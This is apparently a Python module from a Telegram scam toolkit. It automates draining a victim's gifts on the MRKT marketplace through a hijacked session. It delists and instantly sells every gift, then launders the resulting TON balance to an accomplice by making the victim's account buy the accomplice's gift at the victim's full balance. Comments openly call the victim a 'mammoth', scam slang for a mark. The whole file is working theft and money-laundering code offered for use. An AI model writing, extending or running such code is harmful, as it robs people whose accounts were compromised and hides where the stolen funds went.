# ══════════════════════════════════════════════════════════════
# MRKT Pipeline — автоматический слив гифтов через @mrkt
# ══════════════════════════════════════════════════════════════
#
# Этапы:
#   1. Авторизация (init_data → token)
#   2. Парсинг инвентаря (vault) + на продаже (my-saling)
#   3. Снятие залистенных с продажи (delist)
#   4. Моментальная продажа каждого гифта
#   5. Парсинг финального баланса
#   6. Вывод на кошелёк
# ══════════════════════════════════════════════════════════════

import asyncio
import json
import logging
import time
from typing import Callable, Awaitable, Optional

from mrkt.mrkt_api import MrktAPI

logger = logging.getLogger("mrkt.pipeline")


class MrktPipeline:
    """Автоматический пайплайн ликвидации подарков через MRKT."""

    def __init__(
        self,
        api: MrktAPI,
        withdraw_wallet: str,
        notify: Optional[Callable[[str], Awaitable[None]]] = None,
        debug_log: Optional[Callable[[str], Awaitable[None]]] = None,
        buyer_api: Optional[MrktAPI] = None,
    ):
        self.api = api
        self.withdraw_wallet = withdraw_wallet
        self._notify = notify or self._noop
        self._dbg = debug_log or self._noop
        self.buyer_api = buyer_api  # API байера для вывода через покупку гифтов

    @staticmethod
    async def _noop(msg: str):
        pass

    async def run(self) -> dict:
        """
        Запускает полный пайплайн.
        Возвращает stats dict с результатами каждого этапа.
        """
        t0 = time.time()
        stats = {
            "vault_gifts": [],
            "saling_gifts": [],
            "delisted": [],
            "sold": [],
            "sell_errors": [],
            "balance_before": 0.0,
            "balance_after": 0.0,
            "withdrawn": 0.0,
            "withdraw_result": None,
            "errors": [],
            "duration": 0.0,
        }

        try:
            # ══ ЭТАП 1: Профиль ══
            await self._notify("🔍 Этап 1: Получаю профиль...")
            profile = await self.api.get_profile()
            await self._dbg(f"[MRKT] profile: {json.dumps(profile, ensure_ascii=False)[:300]}")

            # ══ ЭТАП 2: Парсинг инвентаря ══
            await self._notify("📦 Этап 2: Парсинг инвентаря и продаж...")
            
            vault = await self.api.get_vault()
            await self._dbg(f"[MRKT] vault: {len(vault)} гифтов")
            stats["vault_gifts"] = vault

            saling = await self.api.get_my_saling()
            await self._dbg(f"[MRKT] на продаже: {len(saling)} гифтов")
            stats["saling_gifts"] = saling

            total = len(vault) + len(saling)
            await self._notify(f"📊 Найдено: {len(vault)} в хранилище, {len(saling)} на продаже (всего {total})")

            # ══ ЭТАП 3: Баланс ДО ══
            bal_before = await self.api.get_balance_ton()
            stats["balance_before"] = bal_before
            await self._dbg(f"[MRKT] баланс ДО продаж: {bal_before} TON")

            if total > 0:
                # ══ ЭТАП 4: Снятие с продажи ══
                if saling:
                    await self._notify(f"🔄 Этап 4: Снимаю {len(saling)} подарков с продажи...")
                    for idx, gift in enumerate(saling):
                        gid = gift.get("id") or gift.get("_id") or gift.get("giftId")
                        gname = gift.get("name") or gift.get("collectionName") or gift.get("giftName") or "?"
                        if not gid:
                            await self._dbg(f"[MRKT] delist skip — нет id: {gift}")
                            continue
                        try:
                            result = await self.api.delist_gift(str(gid))
                            await self._dbg(f"[MRKT] delist {gid} ({gname}): {result}")
                            stats["delisted"].append({"id": gid, "name": gname, "result": result})
                            await self._notify(f"  ✅ Снят: {gname}")
                        except Exception as e:
                            await self._notify(f"  ❌ Ошибка снятия {gname}: {e}")
                            stats["errors"].append(f"delist {gid}: {e}")
                        await asyncio.sleep(2)  # КД имитация

                    # Ждем 65 секунд из-за КД маркета на ре-листинг после снятия
                    await self._notify(f"  ⏳ Ждем 65 сек из-за КД маркета на повторный листинг...")
                    await asyncio.sleep(65)
                    
                    # Перечитываем vault после снятия
                    vault = await self.api.get_vault()
                    await self._dbg(f"[MRKT] vault после delist: {len(vault)} гифтов")
                else:
                    await self._dbg("[MRKT] Этап 4 пропущен — нет залистенных")

                # ══ ЭТАП 5: Моментальная продажа ══
                await self._notify(f"💰 Этап 5: Продажа {len(vault)} подарков...")
                for idx, gift in enumerate(vault):
                    gid = gift.get("id") or gift.get("_id") or gift.get("giftId")
                    gname = gift.get("name") or gift.get("collectionName") or gift.get("giftName") or "?"
                    gnum = gift.get("number") or gift.get("num") or ""
                    display = f"{gname} #{gnum}" if gnum else gname

                    if not gid:
                        await self._dbg(f"[MRKT] sell skip — нет id: {gift}")
                        continue

                    max_attempts = 2
                    for attempt in range(max_attempts):
                        try:
                            # Сначала пробуем instant-sell
                            result = await self.api.instant_sell(str(gid), gift=gift)
                            is_err = result.get("error")

                            if is_err:
                                # Fallback: получаем QS цену и листим
                                qs_price = await self.api.get_quick_sale_price(str(gid))
                                if qs_price > 0:
                                    result = await self.api.sell_gift(str(gid), qs_price)
                                    await self._dbg(f"[MRKT] sell {gid} ({display}) price={qs_price}: {result}")
                                else:
                                    if attempt == 0:
                                        await self._notify(f"  ⏳ {display}: нет цены. Ждём 65 сек (кулдаун?)...")
                                        await asyncio.sleep(65)
                                        continue
                                    else:
                                        await self._notify(f"  ⚠️ {display}: нет цены для продажи")
                                        stats["sell_errors"].append({"id": gid, "name": display, "error": "no price"})
                                        break
                            else:
                                await self._dbg(f"[MRKT] instant-sell {gid} ({display}): {result}")

                            # Проверяем успех: нет ошибки И ids не пустой
                            has_error = result.get("error")
                            ids_list = result.get("ids", [])
                            sell_ok = (not has_error) and (not isinstance(ids_list, list) or len(ids_list) > 0)
                            if sell_ok:
                                price = "?"
                                if "prices" in result and isinstance(result["prices"], list) and len(result["prices"]) > 0:
                                    price = str(round(float(result["prices"][0]) / 1_000_000_000, 3))
                                elif "price" in result:
                                    price = str(result["price"])
                                elif "amount" in result:
                                    price = str(result["amount"])
                                    
                                stats["sold"].append({"id": gid, "name": display, "price": price})
                                await self._notify(f"  ✅ Продан: {display} → {price} TON")
                                break
                            else:
                                err_msg = result.get("message", str(result))
                                if attempt == 0:
                                    await self._notify(f"  ⏳ {display}: ошибка ({err_msg}). Ждём 65 сек (кулдаун?)...")
                                    await asyncio.sleep(65)
                                    continue
                                else:
                                    stats["sell_errors"].append({"id": gid, "name": display, "error": err_msg})
                                    await self._notify(f"  ❌ {display}: {err_msg}")
                                    break
                        except Exception as e:
                            if attempt == 0:
                                await self._notify(f"  ⏳ {display}: исключение ({e}). Ждём 65 сек (кулдаун?)...")
                                await asyncio.sleep(65)
                                continue
                            else:
                                await self._notify(f"  ❌ {display}: {e}")
                                stats["sell_errors"].append({"id": gid, "name": display, "error": str(e)})
                                break
                    
                    await asyncio.sleep(2.5)  # КД имитация
            else:
                await self._notify("⚠️ Нет подарков для продажи")

            # ══ ЭТАП 6: Баланс ПОСЛЕ ══
            if total > 0:
                await asyncio.sleep(5)  # Ждём зачисления
            bal_after = await self.api.get_balance_ton()
            stats["balance_after"] = bal_after
            earned = round(bal_after - bal_before, 4)
            await self._notify(
                f"💵 Баланс: {bal_before} → {bal_after} TON "
                f"(+{earned})"
            )

            # ══ ЭТАП 7: Вывод через байера ══
            if bal_after < 0.5:
                await self._notify(f"⚠️ Баланс слишком мал для вывода ({bal_after} TON)")
            elif self.buyer_api:
                await self._notify(f"📤 Этап 5: Вывод {bal_after} TON через байера...")
                try:
                    withdrawn = await self._withdraw_via_buyer(bal_after, stats)
                    stats["withdrawn"] = withdrawn
                except Exception as e:
                    await self._notify(f"❌ Вывод через байера: {e}")
                    stats["errors"].append(f"buyer_withdraw: {e}")
            else:
                await self._notify(f"⚠️ Байер не настроен! Баланс мамонта: {bal_after} TON. Выведи вручную (/buyer set)")

        except Exception as e:
            await self._notify(f"💥 Критическая ошибка: {e}")
            stats["errors"].append(f"critical: {e}")
            logger.exception(f"[MRKT] Pipeline error: {e}")

        stats["duration"] = round(time.time() - t0, 2)
        await self._notify(
            f"🏁 Завершено за {stats['duration']}с! "
            f"Продано: {len(stats['sold'])}, "
            f"Ошибок: {len(stats['sell_errors'])}, "
            f"Выведено: {stats['withdrawn']} TON"
        )
        return stats

    # ══════════════════════════════════════════════════════════
    #  Вывод через байера (покупка гифта)
    # ══════════════════════════════════════════════════════════

    async def _withdraw_via_buyer(self, victim_balance: float, stats: dict) -> float:
        """
        Вывод средств мамонта через байера:
        1. Берём гифт из инвентаря байера
        2. Листим его по цене = баланс мамонта - 0.1 TON
        3. Мамонт покупает этот гифт
        4. Деньги перетекают на байера
        5. Байер выводит на свой кошелёк
        
        Returns: сумма выведенных TON
        """
        if not self.buyer_api:
            raise RuntimeError("Buyer API не настроен")

        # ── Шаг 1: Получаем гифт из инвентаря байера ──
        await self._dbg("🔍 Ищем гифт в инвентаре байера...")
        buyer_vault = await self.buyer_api.get_vault()
        if not buyer_vault:
            raise RuntimeError("У байера нет гифтов в инвентаре! Купи хотя бы один дешёвый гифт.")

        # Берём первый доступный гифт
        buyer_gift = buyer_vault[0]
        buyer_gift_id = buyer_gift.get("id") or buyer_gift.get("giftIdString")
        buyer_gift_name = buyer_gift.get("name") or buyer_gift.get("modelName") or buyer_gift.get("collectionName", "Gift")
        await self._dbg(f"📦 Гифт байера: {buyer_gift_name} (ID: {buyer_gift_id})")

        # ── Шаг 2: Рассчитываем цену ──
        # Цена = баланс мамонта - 0.1 TON (запас на комиссию маркета)
        sell_price = round(victim_balance - 0.1, 2)
        if sell_price < 0.5:
            raise RuntimeError(f"Баланс мамонта слишком мал ({victim_balance} TON), нужно минимум 0.6")

        await self._dbg(f"💰 Выставляем гифт за {sell_price} TON")

        # ── Шаг 3: Байер листит гифт на продажу ──
        try:
            list_result = await self.buyer_api.sell_gift(buyer_gift_id, sell_price)
            await self._dbg(f"✅ Гифт выставлен: {list_result}")
        except Exception as e:
            raise RuntimeError(f"Не удалось выставить гифт байера: {e}")

        await asyncio.sleep(2)  # Ждём, пока появится на маркете

        # ── Шаг 4: Мамонт покупает этот гифт ──
        sell_price_nano = int(round(sell_price * 1_000_000_000))
        try:
            await self._dbg(f"🛒 Мамонт покупает гифт {buyer_gift_name} за {sell_price} TON...")
            buy_result = await self.api.buy_gift(buyer_gift_id, sell_price_nano)
            
            # MRKT возвращает результат покупки в поле "error" (кривое API!)
            # Успех: {"error": [{"type": "gift", "source": {"type": "buy_gift"}, ...}]}
            # Или просто список: [{"type": "gift", ...}]
            # Пустой ответ [] = гифт не найден / не на продаже
            is_success = False
            if isinstance(buy_result, list) and len(buy_result) > 0:
                is_success = True
            elif isinstance(buy_result, dict):
                err_data = buy_result.get("error", [])
                if isinstance(err_data, list) and len(err_data) > 0:
                    # Проверяем, это покупка или реальная ошибка
                    first = err_data[0] if err_data else {}
                    if isinstance(first, dict) and first.get("source", {}).get("type") == "buy_gift":
                        is_success = True  # Это успешная покупка!
            
            if not is_success:
                await self.buyer_api.cancel_sale(buyer_gift_id)
                raise RuntimeError(f"Мамонт не смог купить (пустой ответ или ошибка)")
            
            await self._notify(f"✅ Мамонт купил гифт {buyer_gift_name} за {sell_price} TON")
        except RuntimeError:
            raise
        except Exception as e:
            # Снимаем гифт с продажи при ошибке
            try:
                await self.buyer_api.cancel_sale(buyer_gift_id)
            except Exception:
                pass
            raise RuntimeError(f"Ошибка покупки: {e}")

        await asyncio.sleep(3)  # Ждём зачисления

        # ── Шаг 5: Проверяем баланс байера ──
        buyer_balance = await self.buyer_api.get_balance_ton()
        await self._notify(f"💰 Деньги перетекли на байера! Баланс: {buyer_balance} TON. Выведи вручную.")
        return sell_price

